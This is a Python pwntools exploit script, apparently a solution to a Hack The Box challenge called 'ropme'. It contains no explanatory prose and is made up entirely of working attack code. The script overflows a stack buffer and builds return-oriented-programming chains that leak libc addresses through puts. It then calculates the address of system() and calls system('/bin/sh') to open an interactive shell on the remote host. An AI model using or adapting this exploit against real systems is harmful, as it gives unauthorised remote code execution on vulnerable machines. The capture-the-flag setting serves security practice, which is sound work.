#!/usr/bin/python
from pwn import *
from struct import pack, unpack
from binascii import unhexlify, hexlify
context(arch = 'amd64', os = 'linux', proxy=(socks.SOCKS5, 'localhost', 8888))

def puts_conv(inStr):
	f = ''
	for i in inStr:
		cc = hex(i)[2:]
		if len(cc) == 1:
			f = '0' + cc + f
		else:
			f = cc + f
	return int(f[2:], 16)

#r = process(argv='./ropme')
r = remote('docker.hackthebox.eu', 31196)
r.recvline()


rbp1 = pack('Q', 0x601D00 + 0x40)
ret_add1 = pack('Q', 0x4006D3) # pop rdi; ret
rdi1 = pack('Q', 0x601020) # libc_main .got address
ret_add2 = pack('Q', 0x40063A) # puts 
output1 = 64*b'A' + rbp1 + ret_add1 + rdi1 + ret_add2
r.sendline(output1)
libc_main = puts_conv(r.recvline()) # __libc_start_main


rbp1 = pack('Q', 0x601D70 + 0x40)
ret_add1 = pack('Q', 0x4006D3) # pop rdi; ret
rdi1 = pack('Q', 0x601018) # puts .got address
ret_add2 = pack('Q', 0x40063A) # puts 
output1 = 64*b'A' + rbp1 + ret_add1 + rdi1 + ret_add2
r.sendline(output1)
puts_add = puts_conv(r.recvline()) # puts

print(hex(libc_main))
print(hex(puts_add))

base_add =  libc_main - 0x20740
system_add = base_add + 0x45390


rbp2 = pack('Q', 0x601DE0 + 0x40)
ret_add3 = pack('Q', 0x4006D3) # pop rdi; ret
rdi2 = pack('Q', 0x601DD0)
sys_ret = pack('Q', system_add)
output2 = 64*b'A' + rbp2 + ret_add3 + rdi2 + sys_ret + b'/bin/sh'
r.sendline(output2)
r.interactive()
